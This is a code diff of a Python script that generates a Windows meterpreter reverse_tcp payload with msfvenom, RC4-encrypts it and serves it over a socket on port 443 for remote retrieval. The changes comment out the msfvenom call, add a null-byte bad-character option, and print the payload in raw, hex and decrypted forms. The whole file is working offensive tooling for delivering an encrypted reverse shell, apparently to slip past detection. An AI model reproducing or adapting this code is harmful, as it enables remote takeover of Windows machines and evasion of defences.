@@ -9,11 +9,13 @@ from Crypto.Cipher import ARC4
 def create_payload_msfvenom(lhost, lport, file):
 	print('+ Creating payload ...')
 	
-	system_call = 'msfvenom --arch x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=' + lhost + ' lport=' + lport + ' -f python -o ' + file
+	badchar = '\\x00'
+	#use badchar 00 to assure that there is no 00 in payload. Is usefull to get the payload with PS and get the lenght
+	#system_call = 'msfvenom --arch x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=' + lhost + ' lport=' + lport + ' -b "' + badchar + '" -f python -o ' + file
 	#print('\n'+system_call+'\n')
 
-	result = os.system(system_call)
-	#result = 0
+	#result = os.system(system_call)
+	result = 0
 	if result == 0:
 		print('+ Payload created and saved as: ' + file)
 	else:
@@ -44,7 +46,6 @@ def clean_payload_msfvenom(file):
 def encrypt_payload(payload, password):
 	obj = ARC4.new(password)
 	payload_encrypted = obj.encrypt(payload)
-	print('+ Payload RC4 encrypted')
 
 	return payload_encrypted
 
@@ -53,7 +54,6 @@ def encrypt_payload(payload, password):
 def decrypt_payload(payload_encrypted, password):
 	obj = ARC4.new(password)
 	payload_decrypted = obj.decrypt(payload_encrypted)
-	print('+ Payload RC4 decrypted')
 
 	return payload_decrypted
 
@@ -117,30 +117,40 @@ if __name__ == '__main__':
 	ip_address = '0.0.0.0'
 	port = 443
 	#IP address and port for meterpreter reverse session
-	lhost = '192.168.1.50'
+	lhost = '192.168.56.101'
 	lport = '4444'
 	#File to save payload
 	file = 'payload.txt'
 
 	#Start
 	print('\n')
-	write_screen("Script started")
+	write_screen('Script started')
+	print('\n')
 
 	#Create payload meterpreter reverse tcp with msfvenom
+	print('\n')
+	print('+ + Payload generated: ')
 	create_payload_msfvenom(lhost, lport, file)
-	#print("\n\n--------------------------------------------------------------------------------------------------------------")
 	payload_cleaned = clean_payload_msfvenom(file)
-	#print(payload_cleaned)
-	#print("\n\n--------------------------------------------------------------------------------------------------------------")
+	print(payload_cleaned)
+	
+	print('\n')
+	print('+ + Payload encrypted: ')
 	payload_encrypted = encrypt_payload(payload_cleaned, password)
-	#print(payload_encrypted)
+	print(payload_encrypted.hex())
+	print(payload_encrypted)
 
-	#print("\n\n--------------------------------------------------------------------------------------------------------------")
-	#payload_decrypted = decrypt_payload(payload_encrypted, password)
-	#print(payload_decrypted)
+	print('\n')
+	print('+ + Payload decrypted: ')
+	payload_decrypted = decrypt_payload(payload_encrypted, password)
+	print(payload_decrypted.hex())
+	print(payload_decrypted)
+	
+	print('\n')
 
 	#Create the socket, listen, send the payload and close it
 	create_socket(ip_address, port, payload_encrypted)
 
-	write_screen("Script finished")
+	print('\n')
+	write_screen('Script finished')
 	print('\n')
